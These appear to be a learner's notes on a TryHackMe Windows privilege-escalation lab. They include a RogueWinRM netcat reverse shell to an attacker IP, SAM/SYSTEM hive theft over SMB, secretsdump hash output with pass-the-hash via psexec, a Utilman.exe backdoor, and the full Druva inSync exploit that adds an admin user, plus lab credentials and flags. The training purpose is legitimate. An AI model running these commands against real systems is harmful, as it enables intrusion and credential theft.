Let's start by assuming we have already compromised a website running on IIS and that we have planted a web shell on the following address:

http://10.10.12.124/

We can use the web shell to check for the assigned privileges of the compromised account and confirm we hold both privileges of interest for this task:


![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/4603506a36f4bbda602dc67cdc845d9f.png)

To use RogueWinRM, we first need to upload the exploit to the target machine. For your convenience, this has already been done, and you can find the exploit in the C:\tools\ folder.

The RogueWinRM exploit is possible because whenever a user (including unprivileged users) starts the BITS service in Windows, it automatically creates a connection to port 5985 using SYSTEM privileges. Port 5985 is typically used for the WinRM service, which is simply a port that exposes a Powershell console to be used remotely through the network. Think of it like SSH, but using Powershell.

If, for some reason, the WinRM service isn't running on the victim server, an attacker can start a fake WinRM service on port 5985 and catch the authentication attempt made by the BITS service when starting. If the attacker has SeImpersonate privileges, he can execute any command on behalf of the connecting user, which is SYSTEM.

Before running the exploit, we'll start a netcat listener to receive a reverse shell on our attacker's machine:

```
Kali Linux

user@attackerpc$ nc -lvp 4442
```

And then, use our web shell to trigger the RogueWinRM exploit using the following command:

```
c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"
```

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/24545e313a2e5ddee2386a68b4c7adeb.png)

Note: The exploit may take up to 2 minutes to work, so your browser may appear as unresponsive for a bit. This happens if you run the exploit multiple times as it must wait for the BITS service to stop before starting it again. The BITS service will stop automatically after 2 minutes of starting.

The -p parameter specifies the executable to be run by the exploit, which is nc64.exe in this case. The -a parameter is used to pass arguments to the executable. Since we want nc64 to establish a reverse shell against our attacker machine, the arguments to pass to netcat will be -e cmd.exe ATTACKER_IP 4442.

If all was correctly set up, you should expect a shell with SYSTEM privileges:

```
Kali Linux

user@attackerpc$ nc -lvp 4442
Listening on 0.0.0.0 4442
Connection received on 10.10.175.90 49755
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>whoami
nt authority\system
```

Using any of the three methods discussed in this task, gain access to the Administrator's desktop and collect the flag. Don't forget to input the flag at the end of this task.

```
┌──(kali㉿kali)-[~]
└─$ xfreerdp /u:THMBackup /p:'CopyMaster555' /v:10.10.12.124 /size:90%

(cmd like administrator and the pass is CopyMaster555)
C:\Windows\system32>whoami
wprivesc2\thmbackup

C:\Windows\system32>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeBackupPrivilege             Back up files and directories  Disabled
SeRestorePrivilege            Restore files and directories  Disabled
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled

C:\Windows\system32>reg save hklm\system C:\Users\THMBackup\system.hive
The operation completed successfully.

C:\Windows\system32>reg save hklm\sam C:\Users\THMBackup\sam.hive
The operation completed successfully.

iniciar smb

──(kali㉿kali)-[~/Downloads]
└─$ mkdir share         
                                                                          
┌──(kali㉿kali)-[~/Downloads]
└─$ locate smbserver.py
/home/kali/Downloads/zerologon_learning/impacketEnv/bin/smbserver.py
/home/kali/Downloads/zerologon_learning/impacketEnv/lib/python3.10/site-packages/impacket/smbserver.py
/usr/lib/python3/dist-packages/impacket/smbserver.py
/usr/share/doc/python3-impacket/examples/smbserver.py
                                                                          
┌──(kali㉿kali)-[~/Downloads]
└─$ python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share

copy the sam and system

C:\Windows\system32>copy C:\Users\THMBackup\sam.hive \\10.11.81.220\public\
        1 file(s) copied.

C:\Windows\system32>copy C:\Users\THMBackup\system.hive \\10.11.81.220\public\
        1 file(s) copied.

┌──(kali㉿kali)-[~/Downloads]
└─$ python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.12.124,49766)
[*] AUTHENTICATE_MESSAGE (WPRIVESC2\THMBackup,WPRIVESC2)
[*] User WPRIVESC2\THMBackup authenticated successfully
[*] THMBackup::WPRIVESC2:aaaaaaaaaaaaaaaa:d45f38dcbff5e570c62f4099a3ebbcb2:010100000000000000a82db0e5bed801c52e9c2e82c41e890000000001001000500069005900510073005900480046000300100050006900590051007300590048004600020010007200590045005a006e0076004f006600040010007200590045005a006e0076004f0066000700080000a82db0e5bed80106000400020000000800300030000000000000000000000000300000911f8859eb84abe4ce766b7f1318f18919c03caf2c06ccaa83cf5a6ff6eabf570a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310031002e00380031002e003200320030000000000000000000
[*] Connecting Share(1:IPC$)
[*] Connecting Share(2:public)
[*] Disconnecting Share(1:IPC$)
[*] Disconnecting Share(2:public)
[*] Closing down connection (10.10.12.124,49766)
[*] Remaining connections []
[*] Incoming connection (10.10.12.124,49769)
[*] AUTHENTICATE_MESSAGE (WPRIVESC2\THMBackup,WPRIVESC2)
[*] User WPRIVESC2\THMBackup authenticated successfully
[*] THMBackup::WPRIVESC2:aaaaaaaaaaaaaaaa:2821fea5b09aacbbc617e5166326e952:0101000000000000800ed9c3e5bed80142bd33a8f63a2abe0000000001001000500069005900510073005900480046000300100050006900590051007300590048004600020010007200590045005a006e0076004f006600040010007200590045005a006e0076004f00660007000800800ed9c3e5bed80106000400020000000800300030000000000000000000000000300000911f8859eb84abe4ce766b7f1318f18919c03caf2c06ccaa83cf5a6ff6eabf570a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310031002e00380031002e003200320030000000000000000000
[*] Connecting Share(1:public)
[*] Disconnecting Share(1:public)
[*] Closing down connection (10.10.12.124,49769)
[*] Remaining connections []


┌──(kali㉿kali)-[~/Downloads]
└─$ cd share               
                                                                          
┌──(kali㉿kali)-[~/Downloads/share]
└─$ ls
sam.hive  system.hive
                                                                          
┌──(kali㉿kali)-[~/Downloads/share]
└─$ locate secretsdump.py
/home/kali/Downloads/zerologon_learning/impacketEnv/bin/secretsdump.py
/home/kali/Downloads/zerologon_learning/impacketEnv/lib/python3.10/site-packages/impacket/examples/secretsdump.py
/usr/lib/python3/dist-packages/impacket/examples/secretsdump.py
/usr/share/doc/python3-impacket/examples/secretsdump.py
/usr/share/metasploit-framework/modules/auxiliary/scanner/smb/impacket/secretsdump.py
/usr/share/responder/tools/MultiRelay/impacket-dev/secretsdump.py
/usr/share/responder/tools/MultiRelay/impacket-dev/impacket/examples/secretsdump.py
                                                                          
┌──(kali㉿kali)-[~/Downloads/share]
└─$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8f81ee5558e2d1205a84d07b0e3b34f5:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:58f8e0214224aebc2c5f82fb7cb47ca1:::
THMBackup:1008:aad3b435b51404eeaad3b435b51404ee:6c252027fb2022f5051e854e08023537:::
THMTakeOwnership:1009:aad3b435b51404eeaad3b435b51404ee:0af9b65477395b680b822e0b2c45b93b:::
[*] Cleaning up... 
                                                                          
┌──(kali㉿kali)-[~/Downloads/share]
└─$ locate psexec.py     
/home/kali/Downloads/zerologon_learning/impacketEnv/bin/psexec.py
/usr/share/doc/python3-impacket/examples/psexec.py
/usr/share/powershell-empire/empire/server/modules/powershell/lateral_movement/invoke_psexec.py
/usr/share/set/src/fasttrack/psexec.py
                                                                          
┌──(kali㉿kali)-[~/Downloads/share]
└─$ python3 /usr/share/doc/python3-impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8f81ee5558e2d1205a84d07b0e3b34f5 administrator@10.10.12.124
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 10.10.12.124.....
[*] Found writable share ADMIN$
[*] Uploading file uPvoHAWy.exe
[*] Opening SVCManager on 10.10.12.124.....
[*] Creating service riWZ on 10.10.12.124.....
[*] Starting service riWZ.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> more C:\Users\Administrator\flag.txt
 
Cannot access file C:\Users\Administrator\flag.txt
C:\Windows\system32> more C:\Users\Administrator\Desktop\flag.txt
THM{SEFLAGPRIVILEGE}



```

Get the flag on the Administrator's desktop.
*THM{SEFLAGPRIVILEGE}*

``` (execute like admin pass TheWorldIsMine2022)
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                              State
============================= ======================================== ========
SeTakeOwnershipPrivilege      Take ownership of files or other objects Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set           Disabled

C:\Windows\system32>takeown /f C:\Windows\System32\Utilman.exe

SUCCESS: The file (or folder): "C:\Windows\System32\Utilman.exe" now owned by user "WPRIVESC2\THMTakeOwnership".

C:\Windows\system32>icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
processed file: C:\Windows\System32\Utilman.exe
Successfully processed 1 files; Failed processing 0 files

C:\Windows\system32>copy cmd.exe utilman.exe
Overwrite utilman.exe? (Yes/No/All): Yes
        1 file(s) copied.
```

![[Pasted image 20220902112423.png]]

``` the 3 ways learned
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 4442

c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe 10.11.81.220 4442" (go to 10.10.12.124 and run)

┌──(kali㉿kali)-[~]
└─$ nc -nlvp 4442
listening on [any] 4442 ...
connect to [10.11.81.220] from (UNKNOWN) [10.10.12.124] 49823
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>more C:\Users\Administrator\Desktop\flag.txt
more C:\Users\Administrator\Desktop\flag.txt
THM{SEFLAGPRIVILEGE}


```

![[Pasted image 20220902113114.png]]


### Abusing vulnerable software 

Make sure to click the Start Machine button before you continue, which will deploy the target machine in split-view. If you prefer connecting to the machine via RDP, you can use the following credentials:

Username 	thm-unpriv
Password 	Password321

Unpatched Software

Software installed on the target system can present various privilege escalation opportunities. As with drivers, organisations and users may not update them as often as they update the operating system. You can use the wmic tool to list software installed on the target system and its versions. The command below will dump information it can gather on installed software (it might take around a minute to finish):

```
wmic product get name,version,vendor
```

Remember that the wmic product command may not return all installed programs. Depending on how some of the programs were installed, they might not get listed here. It is always worth checking desktop shortcuts, available services or generally any trace that indicates the existence of additional software that might be vulnerable.

Once we have gathered product version information, we can always search for existing exploits on the installed software online on sites like exploit-db, [packet storm](https://packetstormsecurity.com/) or plain old Google, amongst many others.

Using wmic and Google, can you find a known vulnerability on any installed product?

```example
C:\Users\User>wmic product get name,version,vendor
Name                                                                                               Vendor                      Version
Python 3.7.6 Add to Path (64-bit)                                                                  Python Software Foundation  3.7.6150.0
Python 3.7.6 pip Bootstrap (64-bit)                                                                Python Software Foundation  3.7.6150.0
Python 3.7.6 Utility Scripts (64-bit)                                                              Python Software Foundation  3.7.6150.0
Python 3.7.6 Tcl/Tk Support (64-bit)                                                               Python Software Foundation  3.7.6150.0
Python 3.7.6 Executables (64-bit)                                                                  Python Software Foundation  3.7.6150.0
Python 3.7.6 Test Suite (64-bit)                                                                   Python Software Foundation  3.7.6150.0
Python 3.7.6 Documentation (64-bit)                                                                Python Software Foundation  3.7.6150.0
Sonic Visualiser                                                                                   sonicvisualiser.org         4.5
Python 3.7.6 Core Interpreter (64-bit)                                                             Python Software Foundation  3.7.6150.0
Python 3.7.6 Standard Library (64-bit)                                                             Python Software Foundation  3.7.6150.0
Python 3.7.6 Development Libraries (64-bit)                                                        Python Software Foundation  3.7.6150.0
Office 16 Click-to-Run Extensibility Component                                                     Microsoft Corporation       16.0.15427.20178
Office 16 Click-to-Run Licensing Component                                                         Microsoft Corporation       16.0.15427.20148
SQL Server Management Studio for Reporting Services                                                Microsoft Corporation       15.0.18424.0
vs_tipsmsi                                                                                         Microsoft Corporation       17.0.31804
Paquete acumulativo de Intellisense de Microsoft .NET Framework para Visual Studio (español)       Microsoft Corporation       4.8.03761
Python Launcher                                                                                    Python Software Foundation  3.7.6925.0
vs_minshellmsires                                                                                  Microsoft Corporation       17.0.31808
HP Client Security Manager                                                                         HP Inc.
       9.4.5.2868
Microsoft Visual Studio Setup WMI Provider                                                         Microsoft Corporation       3.0.4492.23473
Microsoft.NET.Workload.Emscripten.Manifest                                                         Microsoft Corporation       48.23.31171
Microsoft SQL Server 2019 T-SQL Language Service                                                   Microsoft Corporation       15.0.2000.5
Microsoft .NET Framework 4.8 Targeting Pack                                                        Microsoft Corporation       4.8.03761
MySQL Workbench 8.0 CE                                                                             Oracle Corporation          8.0.28
vs_communitysharedmsi                                                                              Microsoft Corporation       17.0.31815
Microsoft Visual C++ 2010  x64 Redistributable - 10.0.40219                                        Microsoft Corporation       10.0.40219
Microsoft Visual C++ 2013 x86 Minimum Runtime - 12.0.40664                                         Microsoft Corporation       12.0.40664
Microsoft Visual C++ 2010  x86 Redistributable - 10.0.40219                                        Microsoft Corporation       10.0.40219
Microsoft Web Deploy 4.0                                                                           Microsoft Corporation       10.0.5402
Microsoft.NET.Sdk.Android.Manifest-6.0.100                                                         Microsoft Corporation       124.25.16400
Microsoft Visual C++ 2022 X64 Minimum Runtime - 14.31.31103                                        Microsoft Corporation       14.31.31103
vs_communityx64msi                                                                                 Microsoft Corporation       17.0.31808
Intel(R) Management Engine Components                                                              Intel Corporation           1.0.0.0
vs_devenvsharedmsi                                                                                 Microsoft Corporation       17.0.31804
Intel(R) Chipset Device Software                                                                   Intel Corporation           10.1.18121.8164
Microsoft.NET.Sdk.Maui.Manifest-6.0.100                                                            Microsoft Corporation       24.25.18227
Intel(R) Icls                                                                                      Intel Corporation           1.0.0.0
Microsoft .NET AppHost Pack - 6.0.1 (x64_x86)                                                      Microsoft Corporation       48.7.32725
vs_clickoncebootstrappermsi                                                                        Microsoft Corporation       17.0.31808
SQL Server 2019 XEvent                                                                             Microsoft Corporation       15.0.2000.5
Epic Online Services                                                                               Epic Games, Inc.            2.0.33.0
IntelliTraceProfilerProxy                                                                          Microsoft Corporation       15.0.21225.01
Microsoft Visual Studio Tools for Applications 2019 x64 Hosting Support                            Microsoft Corporation       16.0.31110
SQL Server 2019 Connection Info                                                                    Microsoft Corporation       15.0.2000.5
SQL Server 2019 DMF                                                                                Microsoft Corporation       15.0.2000.5
Microsoft ASP.NET Core Module for IIS Express                                                      Microsoft Corporation       12.2.18292.0
vs_SQLClickOnceBootstrappermsi                                                                     Microsoft Corporation       17.0.31804
Microsoft Visual Studio Tools for Applications 2019 x86 Hosting Support                            Microsoft Corporation       16.0.31110
Microsoft Windows Desktop Targeting Pack - 6.0.0 (x64)                                             Microsoft Corporation       48.3.31217
Microsoft OLE DB Driver for SQL Server                                                             Microsoft Corporation       18.5.0.0
Microsoft SQL Server 2019 RsFx Driver                                                              Microsoft Corporation       15.0.2000.5
Dynamic Application Loader Host Interface Service                                                  Intel Corporation           1.0.0.0
Microsoft VSS Writer for SQL Server 2019                                                           Microsoft Corporation       15.0.2000.5
Microsoft Windows Desktop Runtime - 6.0.1 (x64)                                                    Microsoft Corporation       48.7.32738
Java 8 Update 281 (64-bit)                                                                         Oracle Corporation          8.0.2810.9
vs_filehandler_amd64                                                                               Microsoft Corporation       17.0.31808
Microsoft ASP.NET Core Module V2 for IIS Express                                                   Microsoft Corporation       16.0.21322.0
Microsoft .NET Framework 4.8 SDK                                                                   Microsoft Corporation       4.8.03928
Microsoft .NET AppHost Pack - 6.0.1 (x64)                                                          Microsoft Corporation       48.7.32725
vs_minshellsharedmsi                                                                               Microsoft Corporation       17.0.31808
Microsoft TestPlatform SDK Local Feed                                                              Microsoft
       17.0.0.5175695
vs_minshellx64msi                                                                                  Microsoft Corporation       17.0.31808
icecap_collection_neutral                                                                          Microsoft Corporation       17.0.31808
SQL Server 2019 Connection Info                                                                    Microsoft Corporation       15.0.2000.5
Microsoft Windows Desktop Runtime - 6.0.1 (x86)                                                    Microsoft Corporation       48.7.32738
Microsoft.NET.Sdk.MacCatalyst.Manifest-6.0.100                                                     Microsoft Corporation       60.25.16415
Microsoft Help Viewer 2.3                                                                          Microsoft Corporation       2.3.28307
Microsoft Visual C++ 2013 x64 Additional Runtime - 12.0.21005                                      Microsoft Corporation       12.0.21005
Paquete de compatibilidad de Microsoft .NET Framework 4.8 (español)                                Microsoft Corporation       4.8.03761
Microsoft .NET SDK 6.0.101 (x64) from Visual Studio                                                Microsoft Corporation       6.1.121.56904
Microsoft ASP.NET Core 6.0.1 Shared Framework (x86)                                                Microsoft Corporation       6.0.1.21567
MySQL Server 8.0                                                                                   Oracle Corporation          8.0.28
Microsoft Update Health Tools                                                                      Microsoft Corporation       4.67.0.0
Adobe Acrobat DC (64-bit)                                                                          Adobe
       22.002.20191
Adobe Refresh Manager                                                                              Adobe Systems Incorporated  1.8.0
icecap_collectionresourcesx64                                                                      Microsoft Corporation       17.0.31808
Microsoft .NET AppHost Pack - 6.0.1 (x64_arm64)                                                    Microsoft Corporation       48.7.32725
Microsoft .NET Runtime - 6.0.1 (x64)                                                               Microsoft Corporation       48.7.32725
SQL Server Management Studio                                                                       Microsoft Corporation       15.0.18424.0
Intel(R) Serial IO                                                                                 Intel Corporation           30.100.2020.7
Microsoft Visual C++ 2013 x64 Minimum Runtime - 12.0.21005                                         Microsoft Corporation       12.0.21005
Microsoft Visual C++ 2019 X86 Additional Runtime - 14.24.28127                                     Microsoft Corporation       14.24.28127
Microsoft VC++ redistributables repacked.                                                          Intel Corporation           12.0.0.0
Microsoft .NET Toolset 6.0.101 (x64)                                                               Microsoft Corporation       24.3.60296
Python 2.7.1                                                                                       Python Software Foundation  2.7.1150
Epic Games Launcher                                                                                Epic Games, Inc.            1.3.23.0
SQL Server 2019 Database Engine Shared                                                             Microsoft Corporation       15.0.2000.5
Browser for SQL Server 2019                                                                        Microsoft Corporation       15.0.2000.5
Microsoft SQL Server 2012 Native Client                                                            Microsoft Corporation       11.4.7462.6
SQL Server 2019 DMF                                                                                Microsoft Corporation       15.0.2000.5
vs_minshellinteropx64msi                                                                           Microsoft Corporation       17.0.31804
SQL Server 2019 Shared Management Objects Extensions                                               Microsoft Corporation       15.0.2000.5
Microsoft VC++ redistributables repacked.                                                          Intel Corporation           12.0.0.0
Microsoft.NET.Sdk.tvOS.Manifest-6.0.100                                                            Microsoft Corporation       60.25.16415
Microsoft Analysis Services OLE DB Provider                                                        Microsoft Corporation       15.0.2000.832
VS JIT Debugger                                                                                    Microsoft Corporation       17.0.114.0
Microsoft Command Line Utilities 15 for SQL Server                                                 Microsoft Corporation       15.0.1300.359
vs_devenx64vmsi                                                                                    Microsoft Corporation       17.0.31804
vs_BlendMsi                                                                                        Microsoft Corporation       17.0.31804
Integration Services                                                                               Microsoft Corporation       15.0.2000.229
HP Notifications                                                                                   HP
       1.1.28.1
SQL Server 2019 SQL Diagnostics                                                                    Microsoft Corporation       15.0.2000.5
VS Immersive Activate Helper                                                                       Microsoft Corporation       17.0.114.0
Microsoft.NET.Sdk.iOS.Manifest-6.0.100                                                             Microsoft Corporation       60.25.16415
SQL Server Management Studio for Analysis Services                                                 Microsoft Corporation       15.0.18424.0
vs_filehandler_x86                                                                                 Microsoft Corporation       17.0.31808
IntelliTraceProfilerProxy                                                                          Microsoft Corporation       15.0.21225.01
IIS 10.0 Express                                                                                   Microsoft Corporation       10.0.05927
HP Security Update Service                                                                         HP Inc.
       4.3.20.873
vs_FileTracker_Singleton                                                                           Microsoft Corporation       17.0.31808
vs_communitymsires                                                                                 Microsoft Corporation       17.0.31808
Microsoft Visual Studio Setup Configuration                                                        Microsoft Corporation       3.0.4492.23473
MySQL Connector/ODBC 8.0                                                                           Oracle Corporation          8.0.28
VMware Workstation                                                                                 VMware, Inc.
       16.1.0
SQL Server 2019 Shared Management Objects                                                          Microsoft Corporation       15.0.2000.5


UE4 Prerequisites (x64)                                                                            Epic Games, Inc.            1.2.0.0
SQL Server 2019 Common Files                                                                       Microsoft Corporation       15.0.2000.5
Microsoft .NET Targeting Pack - 6.0.1 (x64)                                                        Microsoft Corporation       48.7.32725
Microsoft .NET Framework 4.7.1 Targeting Pack                                                      Microsoft Corporation       4.7.02558
Intel(R) Management Engine Driver                                                                  Intel Corporation           1.0.0.0
Microsoft .NET 6.0 Templates 6.0.101 (x64)                                                         Microsoft Corporation       24.3.60296
Paquete de compatibilidad de Microsoft .NET Framework 4.7.2 (español)                              Microsoft Corporation       4.7.03062
Intel(R) LMS                                                                                       Intel Corporation           1.0.0.0
SQL Server Management Studio                                                                       Microsoft Corporation       15.0.18424.0
icecap_collectionresources                                                                         Microsoft Corporation       17.0.31808
ClickOnce Bootstrapper Package for Microsoft .NET Framework                                        Microsoft Corporation       4.8.04162
HP Wolf Security - Console                                                                         HP Inc.
       11.0.16.42
icecap_collection_x64                                                                              Microsoft Corporation       17.0.31808
SQL Server 2019 Shared Management Objects Extensions                                               Microsoft Corporation       15.0.2000.5
Microsoft ODBC Driver 17 for SQL Server                                                            Microsoft Corporation       17.7.2.1
vs_CoreEditorFonts                                                                                 Microsoft Corporation       17.0.32014
Microsoft .NET Host FX Resolver - 6.0.1 (x64)                                                      Microsoft Corporation       48.7.32725
Microsoft ASP.NET Diagnostic Pack for Visual Studio                                                Microsoft Corporation       17.0.795.42246
Microsoft Visual C++ 2022 X64 Additional Runtime - 14.31.31103                                     Microsoft Corporation       14.31.31103
SQL Server 2019 Batch Parser                                                                       Microsoft Corporation       15.0.2000.5
Visual Studio 2017 Isolated Shell for SSMS                                                         Microsoft Corporation       15.0.28307.421
Microsoft.NET.Sdk.macOS.Manifest-6.0.100                                                           Microsoft Corporation       48.25.16415
Microsoft ASP.NET Core 6.0.0 Targeting Pack (x64)                                                  Microsoft Corporation       6.0.0.21526
vs_clickoncesigntoolmsi                                                                            Microsoft Corporation       17.0.31804
SQL Server 2019 Shared Management Objects                                                          Microsoft Corporation       15.0.2000.5
Microsoft .NET Standard Targeting Pack - 2.1.0 (x64)                                               Microsoft Corporation       24.0.28113
MySQL Installer - Community                                                                        Oracle Corporation          1.6.1.0
SQL Server 2019 Database Engine Services                                                           Microsoft Corporation       15.0.2000.5
SQL Server 2019 Database Engine Shared                                                             Microsoft Corporation       15.0.2000.5
Microsoft .NET Host - 6.0.1 (x64)                                                                  Microsoft Corporation       48.7.32725
DiagnosticsHub_CollectionService                                                                   Microsoft Corporation       16.1.28901
HP PC Hardware Diagnostics UEFI                                                                    HP
       7.6.2.0
vs_minshellinteropsharedmsi                                                                        Microsoft Corporation       17.0.31808
Windows SDK AddOn                                                                                  Microsoft Corporation       10.1.0.0
Microsoft Visual C++ 2013 x86 Additional Runtime - 12.0.40664                                      Microsoft Corporation       12.0.40664
Microsoft Analysis Services OLE DB Provider                                                        Microsoft Corporation       15.0.2000.832
Microsoft .NET AppHost Pack - 6.0.1 (x64_arm)                                                      Microsoft Corporation       48.7.32725
Microsoft Visual Studio Tools for Applications 2017 x64 Hosting Support                            Microsoft Corporation       15.0.27520
Microsoft .NET Runtime - 6.0.1 (x86)                                                               Microsoft Corporation       48.7.32725
VS Script Debugging Common                                                                         Microsoft Corporation       17.0.114.0
Microsoft .NET Framework 4.7.2 Targeting Pack                                                      Microsoft Corporation       4.7.03062
SQL Server 2019 Common Files                                                                       Microsoft Corporation       15.0.2000.5
Microsoft .NET Framework 4.8 SDK (español)                                                         Microsoft Corporation       4.8.03761
Windows PC Health Check                                                                            Microsoft Corporation       3.2.2110.14001
Paquete de compatibilidad redirigido de documentación de Microsoft .NET Framework 4.7.1 (español)  Microsoft Corporation       4.7.02558
HP Wolf Security Application Support for Sure Sense                                                HP Inc.
       4.3.20.873
Microsoft SQL Server 2019 Setup (English)                                                          Microsoft Corporation       15.0.4013.40
SQL Server 2019 XEvent                                                                             Microsoft Corporation       15.0.2000.5
HP Wolf Security Application Support for Chrome 102.0.5005.148                                     HP Inc.
       4.3.7.401
Windows Subsystem for Linux Update                                                                 Microsoft Corporation       5.10.16
Microsoft Visual Studio Tools for Applications 2017 x86 Hosting Support                            Microsoft Corporation       15.0.27520
HP Wolf Security Application Support for Windows                                                   HP Inc.
       4.3.2.1711
SQL Server 2019 Database Engine Services                                                           Microsoft Corporation       15.0.2000.5
Java(TM) SE Development Kit 16 (64-bit)                                                            Oracle Corporation          16.0.0.0
Intel(R) Management Engine Components                                                              Intel Corporation           1.0.0.0
Entity Framework 6.2.0 Tools  for Visual Studio 2022                                               Microsoft Corporation       6.2.0.0
HP Wolf Security                                                                                   HP Inc.
       4.3.20.873
SSMS Post Install Tasks                                                                            Microsoft Corporation       15.0.18424.0
Microsoft Visual C++ 2008 Redistributable - x64 9.0.30729.17                                       Microsoft Corporation       9.0.30729
Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.24.28127                                        Microsoft Corporation       14.24.28127
Microsoft .NET Host FX Resolver - 6.0.1 (x86)                                                      Microsoft Corporation       48.7.32725
Microsoft.NET.Workload.Mono.Toolchain.Manifest                                                     Microsoft Corporation       48.3.32725
Java Auto Updater                                                                                  Oracle Corporation          2.8.281.9
HP System Default Settings                                                                         HP Inc.
       1.4.16.3
vs_clickoncebootstrappermsires                                                                     Microsoft Corporation       17.0.31808
vcpp_crt.redist.clickonce                                                                          Microsoft Corporation       14.30.30704
Microsoft ASP.NET Core 6.0.1 Shared Framework (x64)                                                Microsoft Corporation       6.0.1.21567

```

Case Study: Druva inSync 6.6.3

The target server is running Druva inSync 6.6.3, which is vulnerable to privilege escalation as reported by [Matteo Malvica](https://www.matteomalvica.com/blog/2020/05/21/lpe-path-traversal/). The vulnerability results from a bad patch applied over another vulnerability reported initially for version 6.5.0 by [Chris Lyne](https://www.tenable.com/security/research/tra-2020-12).

The software is vulnerable because it runs an RPC (Remote Procedure Call) server on port 6064 with SYSTEM privileges, accessible from localhost only. If you aren't familiar with RPC, it is simply a mechanism that allows a given process to expose functions (called procedures in RPC lingo) over the network so that other machines can call them remotely.

In the case of Druva inSync, one of the procedures exposed (specifically procedure number 5) on port 6064 allowed anyone to request the execution of any command. Since the RPC server runs as SYSTEM, any command gets executed with SYSTEM privileges.

The original vulnerability reported on versions 6.5.0 and prior allowed any command to be run without restrictions. The original idea behind providing such functionality was to remotely execute some specific binaries provided with inSync, rather than any command. Still, no check was made to make sure of that.

A patch was issued, where they decided to check that the executed command started with the string `C:\ProgramData\Druva\inSync4\` where the allowed binaries were supposed to be. But then, this proved insufficient since you could simply make a path traversal attack to bypass this kind of control. Suppose that you want to execute `C:\Windows\System32\cmd.exe`, which is not in the allowed path; you could simply ask the server to run `C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe` and that would bypass the check successfully.

To put together a working exploit, we need to understand how to talk to port 6064. Luckily for us, the protocol in use is straightforward, and the packets to be sent are depicted in the following diagram:



![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/ff706d6530426d3123c0983acd61f934.png)



The first packet is simply a hello packet that contains a fixed string. The second packet indicates that we want to execute procedure number 5, as this is the vulnerable procedure that will execute any command for us. The last two packets are used to send the length of the command and the command string to be executed, respectively.

Initially published by Matteo Malvica [here](https://packetstormsecurity.com/files/160404/Druva-inSync-Windows-Client-6.6.3-Privilege-Escalation.html), the following exploit can be used in your target machine to elevate privileges and retrieve this task's flag. For your convenience, here is the original exploit's code:

```
$ErrorActionPreference = "Stop"

$cmd = "net user pwnd /add"

$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp
)
$s.Connect("127.0.0.1", 6064)

$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
$length = [System.BitConverter]::GetBytes($command.Length);

$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)
```

You can pop a Powershell console and paste the exploit directly to execute it (The exploit is also available in the target machine at `C:\tools\Druva_inSync_exploit.txt`). Note that the exploit's default payload, specified in the `$cmd` variable, will create a user named `pwnd` in the system, but won't assign him administrative privileges, so we will probably want to change the payload for something more useful. For this room, we will change the payload to run the following command:

```
net user pwnd SimplePass123 /add & net localgroup administrators pwnd /add
```

